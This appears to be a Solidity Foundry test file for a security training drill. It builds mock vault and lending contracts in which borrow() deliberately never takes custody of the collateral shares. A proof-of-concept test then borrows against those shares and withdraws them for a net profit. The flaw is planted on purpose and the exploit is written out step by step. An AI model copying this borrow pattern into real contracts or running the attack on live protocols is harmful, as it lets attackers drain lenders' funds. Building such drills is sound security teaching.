// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";

/**
 * DRILL 9 PoC - THE SILENT DRAIN
 * Core bug: LendingMarket.borrow() does NOT transfer vault shares.
 * Attacker keeps vault shares AND borrows tokens — double-spend.
 */

// Minimal ERC20
contract MockToken {
    string public name;
    uint256 public totalSupply;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;

    constructor(string memory _n) { name = _n; }
    function mint(address to, uint256 a) external { totalSupply+=a; balanceOf[to]+=a; }
    function transfer(address to, uint256 a) external returns(bool) {
        require(balanceOf[msg.sender]>=a); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true;
    }
    function transferFrom(address f,address t,uint256 a) external returns(bool) {
        require(balanceOf[f]>=a && allowance[f][msg.sender]>=a);
        allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true;
    }
    function approve(address s,uint256 a) external returns(bool) { allowance[msg.sender][s]=a; return true; }
}

contract VaultPool {
    string public name = "Drill Vault";
    uint256 public totalShares;
    uint256 public totalAssets;
    mapping(address => uint256) public shares;
    MockToken public asset;
    MockToken public rewardToken;
    uint256 public sharePrice;

    constructor(address _a) { asset = MockToken(_a); }

    function deposit(uint256 assets) external returns (uint256 sharesOut) {
        require(assets > 0, "zero");
        if (totalShares == 0) {
            sharesOut = assets;
        } else {
            sharesOut = assets * totalShares / totalAssets;
        }
        totalShares += sharesOut;
        totalAssets += assets;
        shares[msg.sender] += sharesOut;
        asset.transferFrom(msg.sender, address(this), assets);
    }

    function withdraw(uint256 sharesIn) external returns (uint256 assetsOut) {
        require(sharesIn > 0 && sharesIn <= shares[msg.sender], "bad shares");
        assetsOut = sharesIn * totalAssets / totalShares;
        shares[msg.sender] -= sharesIn;
        totalShares -= sharesIn;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }

    function donate(uint256 assets) external {
        require(assets > 0, "zero");
        totalAssets += assets;
        asset.transferFrom(msg.sender, address(this), assets);
    }
}

contract LendingMarket {
    VaultPool public immutable vault;
    uint256 public constant LTV = 75e16;
    uint256 public constant LIQUIDATION_THRESHOLD = 85e16;
    uint256 public constant LIQUIDATION_PENALTY = 5e16;

    struct Position {
        uint256 collateralShares;
        uint256 debt;
    }
    mapping(address => Position) public positions;
    uint256 public totalDebt;
    MockToken public debtToken;

    constructor(address _vault, address _debtToken) {
        vault = VaultPool(_vault);
        debtToken = MockToken(_debtToken);
    }

    function borrow(uint256 sharesAmount, uint256 borrowAmount) external {
        require(sharesAmount > 0, "zero shares");
        // *** THE BUG: share transfer is a COMMENT, never executed! ***
        // In real code: vault.transferFrom(msg.sender, address(this), sharesAmount);
        // Attacker keeps vault shares AND gets the loan.

        uint256 collateralValue = sharesAmount * vault.totalAssets() / vault.totalShares();
        uint256 maxBorrow = collateralValue * LTV / 1e18;
        require(borrowAmount <= maxBorrow, "undercollateralized");

        positions[msg.sender].collateralShares += sharesAmount;
        positions[msg.sender].debt += borrowAmount;
        totalDebt += borrowAmount;

        debtToken.transfer(msg.sender, borrowAmount);
    }
}

contract Drill9PoC is Test {
    VaultPool vault;
    LendingMarket market;
    MockToken asset;
    MockToken debtToken;

    address attacker = address(0xA77);

    function setUp() public {
        asset = new MockToken("Asset");
        debtToken = new MockToken("Debt");
        vault = new VaultPool(address(asset));
        market = new LendingMarket(address(vault), address(debtToken));

        // Fund attacker
        asset.mint(attacker, 1_000_000e18);
        debtToken.mint(address(market), 1_000_000e18); // Lending pool

        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        asset.approve(address(market), type(uint256).max);
    }

    function test_PoC_SilentDrain_DoubleSpend() public {
        uint256 depositAmt = 10_000e18;
        uint256 donateAmt  = 90_000e18;

        // STEP 1: Attacker deposits first (1:1 ratio)
        vm.prank(attacker);
        vault.deposit(depositAmt);
        uint256 sharesGot = vault.shares(attacker);
        assertEq(sharesGot, depositAmt, "1:1 deposit");

        // STEP 2: Attacker donates 90,000e18 — inflates share price to ~10x
        vm.prank(attacker);
        vault.donate(donateAmt);
        uint256 sharePrice = vault.totalAssets() * 1e18 / vault.totalShares();
        assertGt(sharePrice, 9e18, "share price inflated ~10x by donation");

        // STEP 3: Attacker BORROWS using all vault shares as "collateral"
        // CRITICAL: vault.transferFrom is NOT called — shares stay with attacker!
        uint256 collValue = sharesGot * vault.totalAssets() / vault.totalShares();
        uint256 maxBorrow = collValue * market.LTV() / 1e18;
        vm.prank(attacker);
        market.borrow(sharesGot, maxBorrow);
        assertEq(debtToken.balanceOf(attacker), maxBorrow, "borrowed tokens received");

        // STEP 4: Attacker STILL has vault shares (never transferred) — WITHDRAW them!
        uint256 assetBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.withdraw(sharesGot);
        uint256 withdrawn = asset.balanceOf(attacker) - assetBefore;

        // Attacker expense: deposit 10,000 + donate 90,000 = 100,000
        // Attacker received: withdrawn assets (~100,000) + borrowed (~75,000 at 75% LTV)
        uint256 profit = withdrawn + maxBorrow - depositAmt - donateAmt;
        assertGt(profit, 0, "BUG #1: attacker PROFITS from double-spend");
        assertEq(profit, maxBorrow, "Profit = full borrow amount (shares never left attacker)");

        console.log("[PoC #1 - Drill 9] Silent Drain: CRITICAL");
        console.log("  attacker deposit:   ", depositAmt);
        console.log("  attacker donate:    ", donateAmt);
        console.log("  borrowed via loan:  ", maxBorrow);
        console.log("  withdrawn from vault:", withdrawn);
        console.log("  NET PROFIT:         ", profit, "(double-spend: kept shares + took loan)");
    }
}
